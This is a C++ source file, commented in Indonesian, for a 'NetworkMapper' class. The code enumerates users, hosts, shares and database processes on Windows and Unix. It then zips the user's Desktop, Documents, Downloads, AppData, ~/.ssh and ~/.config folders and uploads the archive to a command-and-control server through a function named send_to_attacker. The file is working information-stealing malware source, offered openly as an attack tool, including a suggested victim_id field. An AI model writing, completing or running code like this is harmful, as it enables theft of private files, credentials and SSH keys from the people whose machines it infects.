#include "network_mapper.h"
#include "httplib.h"    // pastikan httplib.h ada di folder yang sama atau di include path

#include <iostream>
#include <fstream>
#include <sstream>
#include <algorithm>
#include <cctype>
#include <ctime>
#include <cstring>
#include <zip.h>        // libzip untuk kompresi

#ifdef _WIN32
#include <windows.h>
#include <lm.h>          // NetUserEnum, dll
#include <iphlpapi.h>    // GetAdaptersInfo
#include <tlhelp32.h>
#include <shlobj.h>
#include <winsock2.h>
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#else
#include <unistd.h>
#include <sys/utsname.h>
#include <net/if.h>
#include <ifaddrs.h>
#include <arpa/inet.h>
#include <pwd.h>
#endif

namespace fs = std::filesystem;

// ==================== IMPLEMENTASI UMUM ====================

NetworkMapper::NetworkMapper() {
    network_log = "";
    log_file.open("network_mapping.log", std::ios::trunc);
    if (!log_file.is_open()) {
        std::cerr << "[ERROR] Gagal membuka network_mapping.log\n";
    }
}

NetworkMapper::~NetworkMapper() {
    if (log_file.is_open()) {
        log_file.close();
    }
}

std::string NetworkMapper::to_lower(const std::string& s) {
    std::string lower = s;
    std::transform(lower.begin(), lower.end(), lower.begin(),
                   [](unsigned char c){ return std::tolower(c); });
    return lower;
}

bool NetworkMapper::ends_with(const std::string& str, const std::string& suffix) {
    if (suffix.size() > str.size()) return false;
    return str.compare(str.size() - suffix.size(), suffix.size(), suffix) == 0;
}

void NetworkMapper::log(const std::string& category, const std::string& info) {
    std::string timestamp = std::to_string(time(nullptr));
    std::string entry = "[" + timestamp + "] [" + category + "] " + info + "\n";

    network_log += entry;
    std::cout << "[NETMAP] " << info << std::endl;

    if (log_file.is_open()) {
        log_file << entry;
        log_file.flush();
    }
}

// ==================== WINDOWS ====================
#ifdef _WIN32

void NetworkMapper::enum_windows_users() {
    log("USER", "=== LOCAL USER ACCOUNTS ===");
    char username[256];
    DWORD size = sizeof(username);
    if (GetUserNameA(username, &size)) {
        log("USER", "Current user: " + std::string(username));
    }

    LPUSER_INFO_0 pBuf = NULL;
    DWORD dwEntriesRead = 0, dwTotalEntries = 0, dwResume = 0;
    NET_API_STATUS status = NetUserEnum(NULL, 0, FILTER_NORMAL_ACCOUNT,
                                        (LPBYTE*)&pBuf, MAX_PREFERRED_LENGTH,
                                        &dwEntriesRead, &dwTotalEntries, &dwResume);

    if (status == NERR_Success && pBuf) {
        for (DWORD i = 0; i < dwEntriesRead; ++i) {
            log("USER", "User: " + std::string((char*)pBuf[i].usri0_name));
        }
        NetApiBufferFree(pBuf);
    }
}

void NetworkMapper::enum_windows_system_info() {
    log("SYSTEM", "=== SYSTEM INFO ===");
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    log("SYSTEM", "Hostname: " + std::string(hostname));

    OSVERSIONINFOEXA osvi = { sizeof(osvi) };
    if (GetVersionExA((LPOSVERSIONINFOA)&osvi)) {
        log("SYSTEM", "Windows " + std::to_string(osvi.dwMajorVersion) + "." +
                      std::to_string(osvi.dwMinorVersion) + " Build " +
                      std::to_string(osvi.dwBuildNumber));
    }

    log("NETWORK", "=== NETWORK ADAPTERS ===");
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    IP_ADAPTER_INFO adapterInfo[16];
    if (GetAdaptersInfo(adapterInfo, &ulOutBufLen) == ERROR_SUCCESS) {
        PIP_ADAPTER_INFO pAdapter = adapterInfo;
        while (pAdapter) {
            log("NETWORK", "Adapter: " + std::string(pAdapter->Description));
            log("NETWORK", "  IP: " + std::string(pAdapter->IpAddressList.IpAddress.String));
            pAdapter = pAdapter->Next;
        }
    }
}

void NetworkMapper::enum_network_shares() {
    log("SHARE", "=== LOCAL SHARES ===");
    PSHARE_INFO_1 pBuf = NULL;
    DWORD entries = 0, total = 0, resume = 0;
    if (NetShareEnum(NULL, 1, (LPBYTE*)&pBuf, MAX_PREFERRED_LENGTH,
                     &entries, &total, &resume) == NERR_Success) {
        for (DWORD i = 0; i < entries; ++i) {
            if (pBuf[i].shi1_type != STYPE_SPECIAL) {
                log("SHARE", "Share: \\\\" + std::string((char*)pBuf[i].shi1_netname));
            }
        }
        NetApiBufferFree(pBuf);
    }
}

void NetworkMapper::enum_processes() {
    log("PROCESS", "=== INTERESTING PROCESSES ===");
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = { sizeof(pe) };
        if (Process32First(hSnap, &pe)) {
            do {
                std::string name = to_lower(pe.szExeFile);
                if (name.find("sql") != std::string::npos ||
                    name.find("mysql") != std::string::npos ||
                    name.find("postgres") != std::string::npos ||
                    name.find("backup") != std::string::npos) {
                    log("PROCESS", pe.szExeFile + " (PID: " + std::to_string(pe.th32ProcessID) + ")");
                }
            } while (Process32Next(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }
}

#else

// ==================== UNIX/LINUX/MAC ====================

void NetworkMapper::enum_unix_users() {
    log("USER", "=== USER ACCOUNTS ===");
    struct passwd* pw = getpwuid(getuid());
    if (pw) {
        log("USER", "Current: " + std::string(pw->pw_name) + " (" + pw->pw_dir + ")");
    }

    std::ifstream f("/etc/passwd");
    std::string line;
    while (std::getline(f, line)) {
        size_t pos = line.find(':');
        if (pos != std::string::npos) {
            std::string user = line.substr(0, pos);
            if (!user.empty() && user[0] != '_' && user != "root" &&
                user != "daemon" && user != "bin") {
                log("USER", "User: " + user);
            }
        }
    }
}

void NetworkMapper::enum_unix_system_info() {
    log("SYSTEM", "=== SYSTEM INFO ===");
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    log("SYSTEM", "Hostname: " + std::string(hostname));

    struct utsname u;
    if (uname(&u) == 0) {
        log("SYSTEM", std::string(u.sysname) + " " + u.release + " (" + u.machine + ")");
    }

    log("NETWORK", "=== INTERFACES ===");
    struct ifaddrs *ifaddr, *ifa;
    if (getifaddrs(&ifaddr) == 0) {
        for (ifa = ifaddr; ifa; ifa = ifa->ifa_next) {
            if (!ifa->ifa_addr || ifa->ifa_addr->sa_family != AF_INET) continue;
            if (strcmp(ifa->ifa_name, "lo") == 0) continue;

            char ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &((struct sockaddr_in*)ifa->ifa_addr)->sin_addr, ip, sizeof(ip));
            log("NETWORK", std::string(ifa->ifa_name) + " → " + ip);
        }
        freeifaddrs(ifaddr);
    }
}

void NetworkMapper::enum_unix_shares() {
    log("SHARE", "=== NFS / CIFS SHARES ===");
    std::ifstream mounts("/proc/mounts");
    std::string line;
    while (std::getline(mounts, line)) {
        if (line.find("nfs") != std::string::npos || line.find("cifs") != std::string::npos) {
            log("SHARE", line);
        }
    }
}

void NetworkMapper::enum_unix_processes() {
    log("PROCESS", "=== INTERESTING PROCESSES ===");
    for (const auto& entry : fs::directory_iterator("/proc")) {
        std::string pid = entry.path().filename().string();
        if (!std::all_of(pid.begin(), pid.end(), ::isdigit)) continue;

        std::ifstream cmd(entry.path() / "cmdline");
        std::string cmdline;
        std::getline(cmd, cmdline, '\0');
        std::string lc = to_lower(cmdline);

        if (lc.find("sql") != std::string::npos ||
            lc.find("mysql") != std::string::npos ||
            lc.find("postgres") != std::string::npos ||
            lc.find("backup") != std::string::npos) {
            log("PROCESS", cmdline + " (PID: " + pid + ")");
        }
    }
}

#endif

// ==================== PENGUMPULAN FOLDER & ZIP ====================

void NetworkMapper::collect_sensitive_directories(std::vector<std::string>& paths) {
#ifdef _WIN32
    char buf[MAX_PATH];
    const int folders[] = {
        CSIDL_DESKTOP, CSIDL_MYDOCUMENTS, CSIDL_DOWNLOADS,
        CSIDL_MYMUSIC, CSIDL_MYPICTURES, CSIDL_MYVIDEO,
        CSIDL_APPDATA, CSIDL_LOCAL_APPDATA
    };

    for (int id : folders) {
        if (SUCCEEDED(SHGetFolderPathA(NULL, id, NULL, 0, buf))) {
            paths.emplace_back(buf);
        }
    }
#else
    const char* home = getenv("HOME");
    if (home) {
        std::string h(home);
        paths.insert(paths.end(), {
            h + "/Desktop", h + "/Documents", h + "/Downloads",
            h + "/Pictures", h + "/Music", h + "/Videos",
            h + "/.ssh", h + "/.config", h + "/.local/share"
        });
    }
#endif
}

bool NetworkMapper::create_zip_archive(const std::vector<std::string>& paths, const std::string& zip_path) {
    int err = 0;
    zip_t* z = zip_open(zip_path.c_str(), ZIP_CREATE | ZIP_TRUNCATE, &err);
    if (!z) {
        log("ZIP", "Gagal membuat ZIP (error " + std::to_string(err) + ")");
        return false;
    }

    size_t added = 0, skipped = 0;

    for (const auto& base : paths) {
        if (!fs::exists(base) || !fs::is_directory(base)) continue;

        try {
            for (const auto& entry : fs::recursive_directory_iterator(
                    base, fs::directory_options::skip_permission_denied)) {

                if (!entry.is_regular_file()) continue;

                // Skip file terlalu besar (> 100 MB)
                if (entry.file_size() > 100ULL * 1024 * 1024) {
                    skipped++;
                    continue;
                }

                std::string full = entry.path().string();
                std::string rel = fs::relative(full, base).string();

                zip_source_t* src = zip_source_file(z, full.c_str(), 0, 0);
                if (src && zip_file_add(z, rel.c_str(), src, ZIP_FL_ENC_UTF_8) >= 0) {
                    added++;
                } else if (src) {
                    zip_source_free(src);
                }
            }
        } catch (const std::exception& e) {
            log("ZIP", "Error saat scan " + base + ": " + e.what());
        }
    }

    // Sertakan log mapping
    if (fs::exists("network_mapping.log")) {
        zip_source_t* src = zip_source_file(z, "network_mapping.log", 0, 0);
        if (src) zip_file_add(z, "network_mapping.log", src, ZIP_FL_ENC_UTF_8);
    }

    zip_close(z);

    log("ZIP", "ZIP selesai: " + zip_path);
    log("ZIP", "File ditambahkan: " + std::to_string(added) + ", diskip: " + std::to_string(skipped));
    return true;
}

// ==================== PENGIRIMAN KE C2 ====================

void NetworkMapper::send_to_attacker(const std::string& c2_url) {
    if (c2_url.empty()) {
        log("C2", "Tidak ada URL C2 → skip pengiriman");
        return;
    }

    log("C2", "Memulai pengiriman ke: " + c2_url);

    std::string zip_name = "collected_" + std::to_string(time(nullptr)) + ".zip";

    std::vector<std::string> targets;
    collect_sensitive_directories(targets);

    if (!create_zip_archive(targets, zip_name)) {
        log("C2", "Gagal membuat ZIP → batal kirim");
        return;
    }

    httplib::Client cli(c2_url);

    // Uncomment baris berikut jika server menggunakan sertifikat self-signed (untuk testing saja)
    // cli.set_ca_cert_path(nullptr);

    httplib::UploadFormDataItems items = {
        { "file", zip_name, zip_name, "application/zip" }
        // Tambah field lain jika diperlukan, contoh:
        // { "victim_id", "victim-12345", "", "" },
        // { "timestamp", std::to_string(time(nullptr)), "", "" }
    };

    auto res = cli.Post("/upload", items);

    if (res && res->status == 200) {
        log("C2", "Berhasil dikirim (status: " + std::to_string(res->status) + ")");
        log("C2", "Respon body: " + res->body);
    } else {
        log("C2", "Gagal kirim: " +
            (res ? "status " + std::to_string(res->status) : "tidak ada respon"));
        if (res) {
            log("C2", "Detail error: " + res->body);
        }
    }

    // Opsional: hapus file ZIP setelah berhasil dikirim
    // fs::remove(zip_name);
}

// ==================== ENTRY POINT UTAMA ====================

void NetworkMapper::perform_mapping() {
    log("INFO", "=== PENGUMPULAN DATA DIMULAI ===");

#ifdef _WIN32
    enum_windows_users();
    enum_windows_system_info();
    enum_network_shares();
    enum_processes();
#else
    enum_unix_users();
    enum_unix_system_info();
    enum_unix_shares();
    enum_unix_processes();
#endif

    log("INFO", "=== PENGUMPULAN DATA SELESAI ===");
}
